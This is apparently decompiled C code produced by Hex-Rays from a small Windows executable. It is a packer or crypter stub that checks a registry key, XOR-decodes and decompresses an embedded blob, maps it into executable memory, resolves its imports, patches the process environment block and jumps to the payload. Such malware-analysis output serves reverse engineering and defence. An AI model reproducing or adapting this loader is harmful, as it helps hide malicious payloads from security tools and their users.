/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401020(int, int, unsigned int);
// int __usercall start@<eax>(int@<ebx>, int@<edi>, int@<esi>, _DWORD *);
FARPROC __cdecl sub_401270(HMODULE hModule, LPCSTR lpProcName);
int __stdcall sub_401290(int);
int __cdecl sub_4017C0(int, int);
LPVOID __cdecl sub_401830(SIZE_T dwSize);
int __cdecl sub_401860(int, _DWORD *);
int __cdecl sub_4019B0(int);
unsigned int __cdecl sub_4019E0(char *, int, unsigned int);
int __cdecl sub_401AE0(int *, char *);

//-------------------------------------------------------------------------
// Data declarations

// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
_UNKNOWN loc_401234; // weak
_DWORD dword_403000[117] =
{
  16257,
  20992,
  -1873142813,
  768,
  21198,
  16776960,
  61134,
  0,
  120395470,
  117910792,
  755914979,
  8390407,
  521033422,
  -1275064646,
  -1205756985,
  567102465,
  1936277146,
  1869770784,
  1835082921,
  1851876128,
  544487840,
  1914725730,
  1763719355,
  1329864814,
  1869444765,
  221144420,
  757357763,
  1162888199,
  21780174,
  -389152759,
  137173690,
  234938456,
  33643981,
  1572920,
  5134030,
  131072,
  1180366,
  1048576,
  758142670,
  756973831,
  755129034,
  20480262,
  1082216931,
  -801307347,
  17649891,
  520432989,
  536893134,
  757859885,
  86856650,
  117910792,
  -1607442717,
  759694893,
  -1335502889,
  285212672,
  226653667,
  757277485,
  1949194946,
  7632997,
  370693838,
  293668653,
  -2129888298,
  101068101,
  1613780654,
  1952539694,
  22191,
  285486564,
  -2130215938,
  237837356,
  1610618598,
  1936862912,
  808596924,
  756350976,
  759027145,
  756963332,
  3243734,
  1812213152,
  22190,
  6,
  672627706,
  -2113458895,
  120399586,
  271399544,
  120415974,
  671558992,
  671578958,
  672345404,
  762521004,
  763890692,
  764433354,
  810583064,
  761886734,
  762413319,
  137174730,
  759045251,
  1818570458,
  120415087,
  11553357,
  756154368,
  1077269468,
  759324672,
  758830492,
  2083344978,
  -444005454,
  -922204789,
  -444005619,
  -1593250685,
  4257398,
  1726021577,
  268925790,
  269430220,
  269449990,
  269430196,
  269450082,
  269430204,
  269449994,
  269168064,
  1988990215
}; // weak
CHAR aRegopenkeya[] = "RegOpenKeyA"; // idb
CHAR LibFileName[] = "advapi32.dll"; // idb
char aSoftwareClasse[22] = "SOFTWARE\\Classes\\.dll"; // weak
CHAR ProcName[] = "UnmapViewOfFile"; // idb
CHAR ModuleName[] = "kernel32.dll"; // idb
CHAR aCreatefilemapp[] = "CreateFileMappingA"; // idb
CHAR aKernel32Dll_1[] = "kernel32.dll"; // idb
CHAR aMapviewoffilee[] = "MapViewOfFileEx"; // idb
CHAR aKernel32Dll_2[] = "kernel32.dll"; // idb
int dword_407024 = 0; // weak
int dword_407028 = 0; // weak
int dword_40702C = 0; // weak
int dword_407030 = 0; // weak
LPVOID lpAddress = NULL; // idb
int dword_407038 = 0; // weak
int dword_40703C = 0; // weak
int dword_407040 = 0; // weak
int dword_407044 = 0; // weak
int dword_407048 = 0; // weak
int (*dword_40704C)(void) = NULL; // weak


//----- (00401020) --------------------------------------------------------
int __cdecl sub_401020(int a1, int a2, unsigned int a3)
{
  int result; // eax

  for ( dword_40702C = 0; dword_40702C < a3; ++dword_40702C )
  {
    *(_BYTE *)(dword_40702C + a1) = *(_BYTE *)(dword_40702C + a2);
    result = dword_40702C + 1;
  }
  return result;
}
// 40702C: using guessed type int dword_40702C;

//----- (004010B0) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, _DWORD *a4)
{
  HMODULE LibraryA; // eax
  SIZE_T dwSize; // [esp+Ch] [ebp-8Ch]
  unsigned int v7; // [esp+10h] [ebp-88h]
  char v8[4]; // [esp+14h] [ebp-84h] BYREF
  char *v9; // [esp+18h] [ebp-80h]
  char *ModuleHandleA; // [esp+1Ch] [ebp-7Ch]
  FARPROC v11; // [esp+20h] [ebp-78h]
  _DWORD *v12; // [esp+24h] [ebp-74h]
  unsigned int i; // [esp+94h] [ebp-4h]
  int savedregs; // [esp+98h] [ebp+0h] BYREF

  ModuleHandleA = (char *)GetModuleHandleA(0);
  v12 = a4;
  dword_407044 = (_WORD)a4 == 0;
  if ( !a4 )
    dword_407044 = 0;
  if ( dword_407044 )
    lpAddress = v12;
  LibraryA = LoadLibraryA(LibFileName);
  v11 = sub_401270(LibraryA, aRegopenkeya);
  if ( ((int (__stdcall *)(int, char *, char *))v11)(-2147483646, aSoftwareClasse, v8) )
    return 0;
  v9 = (char *)dword_403000;
  v7 = dword_403000[0];
  dwSize = dword_403000[1];
  for ( i = 0; i < v7; i += 8 )
    *(_DWORD *)&v9[i + 8] ^= 0x56CEu;
  dword_407040 = (int)sub_401830(dwSize);
  sub_4019E0(v9 + 8, dword_407040, v7);
  dword_407030 = a2;
  dword_407028 = a3;
  dword_40703C = a1;
  dword_407048 = (int)NtCurrentTeb();
  i = (unsigned int)&loc_401234;
  dword_407038 = (int)&savedregs;
  if ( dword_407044 )
    sub_401860(i - (_DWORD)v12, v12);
  else
    sub_401860(i - (_DWORD)ModuleHandleA, ModuleHandleA);
  sub_401290(dword_407040);
  return dword_40704C();
}
// 403000: using guessed type _DWORD dword_403000[117];
// 407028: using guessed type int dword_407028;
// 407030: using guessed type int dword_407030;
// 407038: using guessed type int dword_407038;
// 40703C: using guessed type int dword_40703C;
// 407040: using guessed type int dword_407040;
// 407044: using guessed type int dword_407044;
// 407048: using guessed type int dword_407048;
// 40704C: using guessed type int (*dword_40704C)(void);
// 4010B0: using guessed type char var_84[4];

//----- (00401270) --------------------------------------------------------
FARPROC __cdecl sub_401270(HMODULE hModule, LPCSTR lpProcName)
{
  return GetProcAddress(hModule, lpProcName);
}

//----- (00401290) --------------------------------------------------------
int __stdcall sub_401290(int a1)
{
  HMODULE ModuleHandleA; // eax
  HMODULE v3; // eax
  FARPROC v4; // eax
  HMODULE v5; // eax
  const CHAR *j; // [esp+4h] [ebp-4Ch]
  _DWORD *v7; // [esp+Ch] [ebp-44h]
  char *v8; // [esp+10h] [ebp-40h]
  int v9; // [esp+14h] [ebp-3Ch]
  char *v10; // [esp+14h] [ebp-3Ch]
  BOOL (__stdcall *UnmapViewOfFile)(LPCVOID); // [esp+18h] [ebp-38h]
  int *v12; // [esp+1Ch] [ebp-34h]
  const CHAR *v13; // [esp+20h] [ebp-30h]
  unsigned int v14; // [esp+24h] [ebp-2Ch]
  _DWORD *v15; // [esp+28h] [ebp-28h]
  int *v16; // [esp+2Ch] [ebp-24h]
  const CHAR *k; // [esp+30h] [ebp-20h]
  HMODULE hModule; // [esp+34h] [ebp-1Ch]
  int v19; // [esp+38h] [ebp-18h]
  LPVOID (__stdcall *MapViewOfFileEx)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID); // [esp+3Ch] [ebp-14h]
  int (__stdcall *v21)(LPVOID, _DWORD, int); // [esp+40h] [ebp-10h]
  unsigned int i; // [esp+44h] [ebp-Ch]
  unsigned int m; // [esp+44h] [ebp-Ch]
  HANDLE hObject; // [esp+48h] [ebp-8h]
  HANDLE (__stdcall *CreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR); // [esp+4Ch] [ebp-4h]

  v9 = *(_DWORD *)(a1 + 60) + a1;
  v15 = (_DWORD *)(v9 + *(unsigned __int16 *)(v9 + 20) + 24);
  v13 = (const CHAR *)VirtualAlloc(0, *(_DWORD *)(v9 + 80), 0x3000u, 0x40u);
  if ( !v13 )
    return 0;
  sub_401020((int)v13, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v9 + 6) + 312);
  ModuleHandleA = GetModuleHandleA(ModuleName);
  UnmapViewOfFile = (BOOL (__stdcall *)(LPCVOID))GetProcAddress(ModuleHandleA, ProcName);
  v3 = GetModuleHandleA(aKernel32Dll_1);
  CreateFileMappingA = (HANDLE (__stdcall *)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))GetProcAddress(v3, aCreatefilemapp);
  for ( i = 0; i < *(unsigned __int16 *)(v9 + 6); ++i )
  {
    if ( v15[5] )
    {
      if ( v15[4] )
        sub_401020(
          (int)&v13[v15[3]],
          v15[5] + a1,
          *(_DWORD *)(v9 + 60) * ((unsigned int)(v15[4] + *(_DWORD *)(v9 + 60) - 1) / *(_DWORD *)(v9 + 60)));
    }
    v15 += 10;
  }
  v10 = (char *)&v13[*((_DWORD *)v13 + 15)];
  hObject = CreateFileMappingA((HANDLE)-1, 0, 4, 0, *((_DWORD *)v10 + 20), 0);
  if ( !hObject )
    return 0;
  for ( j = &v13[*((_DWORD *)v10 + 32)]; *((_DWORD *)j + 4); j += 20 )
  {
    hModule = LoadLibraryA(&v13[*((_DWORD *)j + 3)]);
    if ( *(_DWORD *)j )
    {
      v16 = (int *)&v13[*(_DWORD *)j];
      v12 = (int *)&v13[*((_DWORD *)j + 4)];
    }
    else
    {
      v16 = (int *)&v13[*((_DWORD *)j + 4)];
      v12 = (int *)&v13[*(_DWORD *)j];
    }
    v19 = 0;
    if ( *((_DWORD *)j + 4) && *(_DWORD *)j )
      v19 = 1;
    while ( *v16 )
    {
      if ( *v16 >= 0 )
        v4 = sub_401270(hModule, &v13[*v16 + 2]);
      else
        v4 = sub_401270(hModule, (LPCSTR)(*v16 & 0x7FFFFFFF));
      *v16 = (int)v4;
      if ( !*v16 )
        return 0;
      if ( v19 )
        *v12 = *v16;
      ++v16;
      ++v12;
    }
  }
  if ( dword_407044 )
  {
    v8 = (char *)lpAddress - *((_DWORD *)v10 + 13);
    if ( *((_DWORD *)v10 + 41) )
    {
      for ( k = &v13[*((_DWORD *)v10 + 40)]; *((_DWORD *)k + 1); k += *((_DWORD *)k + 1) )
      {
        v14 = (unsigned int)(*((_DWORD *)k + 1) - 8) >> 1;
        v7 = k + 8;
        for ( m = 0; m < v14; ++m )
        {
          if ( (int)*((unsigned __int16 *)v7 + m) >> 12 == 3 )
            *(_DWORD *)&v13[*(_DWORD *)k + (*((_WORD *)v7 + m) & 0xFFF)] += v8;
        }
      }
    }
  }
  v5 = GetModuleHandleA(aKernel32Dll_2);
  MapViewOfFileEx = (LPVOID (__stdcall *)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID))GetProcAddress(
                                                                                         v5,
                                                                                         aMapviewoffilee);
  if ( dword_407044 )
    dword_407024 = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, lpAddress);
  else
    dword_407024 = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, *((LPVOID *)v10 + 13));
  if ( !dword_407024 )
  {
    if ( dword_407044 )
    {
      if ( !UnmapViewOfFile(lpAddress) && !v21(lpAddress, 0, 0x8000) )
        return 0;
    }
    else if ( !UnmapViewOfFile(*((LPCVOID *)v10 + 13)) && !v21(*((LPVOID *)v10 + 13), 0, 0x8000) )
    {
      return 0;
    }
    if ( dword_407044 )
      dword_407024 = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, lpAddress);
    else
      dword_407024 = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, *((LPVOID *)v10 + 13));
    if ( !dword_407024 )
    {
      if ( dword_407044 )
        dword_407024 = (int)VirtualAlloc(lpAddress, *((_DWORD *)v10 + 20), 0x3000u, 0x40u);
      else
        dword_407024 = (int)VirtualAlloc(*((LPVOID *)v10 + 13), *((_DWORD *)v10 + 20), 0x3000u, 0x40u);
    }
  }
  CloseHandle(hObject);
  sub_401020(dword_407024, (int)v13, *((_DWORD *)v10 + 20));
  if ( dword_407044 )
    sub_4017C0((int)lpAddress, *((_DWORD *)v10 + 10) + dword_407024);
  else
    sub_4019B0(dword_407024);
  dword_40704C = (int (*)(void))(*((_DWORD *)v10 + 10) + dword_407024);
  *((_DWORD *)v10 + 10) = dword_40704C;
  return 1;
}
// 401668: variable 'v21' is possibly undefined
// 407024: using guessed type int dword_407024;
// 407044: using guessed type int dword_407044;
// 40704C: using guessed type int (*dword_40704C)(void);

//----- (004017C0) --------------------------------------------------------
int __cdecl sub_4017C0(int a1, int a2)
{
  _DWORD *v3; // [esp+4h] [ebp-8h]

  v3 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_407048 + 48) + 12) + 12);
  do
  {
    if ( !v3 )
      return 0;
    if ( v3[6] == a1 )
    {
      v3[7] = a2;
      return 1;
    }
    v3 = (_DWORD *)*v3;
  }
  while ( v3 != *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_407048 + 48) + 12) + 12) );
  return 0;
}
// 407048: using guessed type int dword_407048;

//----- (00401830) --------------------------------------------------------
LPVOID __cdecl sub_401830(SIZE_T dwSize)
{
  return VirtualAlloc(0, dwSize, 0x3000u, 4u);
}

//----- (00401860) --------------------------------------------------------
int __cdecl sub_401860(int a1, _DWORD *a2)
{
  _DWORD *v3; // [esp+4h] [ebp-1Ch]
  _DWORD *v4; // [esp+8h] [ebp-18h]
  int v5; // [esp+Ch] [ebp-14h]
  SIZE_T *v6; // [esp+10h] [ebp-10h]
  unsigned int v7; // [esp+14h] [ebp-Ch]
  _DWORD *i; // [esp+18h] [ebp-8h]
  unsigned int j; // [esp+1Ch] [ebp-4h]

  if ( dword_407044 )
    v3 = lpAddress;
  else
    v3 = a2;
  v6 = (_DWORD *)((char *)v3 + v3[15]);
  dword_407024 = (int)VirtualAlloc(0, v6[20], 0x3000u, 0x40u);
  if ( dword_407024 )
  {
    sub_401020(dword_407024, (int)v3, v6[20]);
    v5 = dword_407024 - (_DWORD)v3;
    if ( v6[41] )
    {
      for ( i = (_DWORD *)((char *)v3 + v6[40]); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v7 = (unsigned int)(i[1] - 8) >> 1;
        v4 = i + 2;
        for ( j = 0; j < v7; ++j )
        {
          if ( (int)*((unsigned __int16 *)v4 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_407024 + (*((_WORD *)v4 + j) & 0xFFF)) += v5;
        }
      }
    }
    __asm { jmp     edx }
  }
  return 2;
}
// 407024: using guessed type int dword_407024;
// 407044: using guessed type int dword_407044;

//----- (004019B0) --------------------------------------------------------
int __cdecl sub_4019B0(int a1)
{
  int result; // eax

  result = *(_DWORD *)(dword_407048 + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 407048: using guessed type int dword_407048;

//----- (004019E0) --------------------------------------------------------
unsigned int __cdecl sub_4019E0(char *a1, int a2, unsigned int a3)
{
  int v3; // eax
  int v4; // eax
  unsigned int result; // eax
  int v6; // [esp+0h] [ebp-1Ch] BYREF
  unsigned int i; // [esp+4h] [ebp-18h]
  int v8; // [esp+8h] [ebp-14h]
  char v9; // [esp+Fh] [ebp-Dh]
  unsigned int v10; // [esp+10h] [ebp-Ch] BYREF
  unsigned int v11; // [esp+14h] [ebp-8h]
  char v12; // [esp+1Bh] [ebp-1h]

  v11 = 1;
  v9 = *a1;
  v8 = 0;
  do
  {
    v12 = a1[v11++];
    if ( v12 == v9 )
    {
      if ( a1[v11] )
      {
        v3 = sub_401AE0((int *)&v10, &a1[v11]);
        v11 += v3;
        v4 = sub_401AE0(&v6, &a1[v11]);
        v11 += v4;
        for ( i = 0; i < v10; ++i )
        {
          *(_BYTE *)(v8 + a2) = *(_BYTE *)(a2 + v8 - v6);
          ++v8;
        }
      }
      else
      {
        *(_BYTE *)(v8 + a2) = v9;
        ++v8;
        ++v11;
      }
    }
    else
    {
      *(_BYTE *)(v8 + a2) = v12;
      ++v8;
    }
    result = v11;
  }
  while ( v11 < a3 );
  return result;
}

//----- (00401AE0) --------------------------------------------------------
int __cdecl sub_401AE0(int *a1, char *a2)
{
  int v3; // [esp+4h] [ebp-Ch]
  char v4; // [esp+8h] [ebp-8h]
  int v5; // [esp+Ch] [ebp-4h]

  v5 = 0;
  v3 = 0;
  do
  {
    v4 = *a2++;
    v5 = (v5 << 7) | v4 & 0x7F;
    ++v3;
  }
  while ( (v4 & 0x80) != 0 );
  *a1 = v5;
  return v3;
}

// nfuncs=10 queued=10 decompiled=10 lumina nreq=0 worse=0 better=0
// ALL OK, 10 function(s) have been successfully decompiled
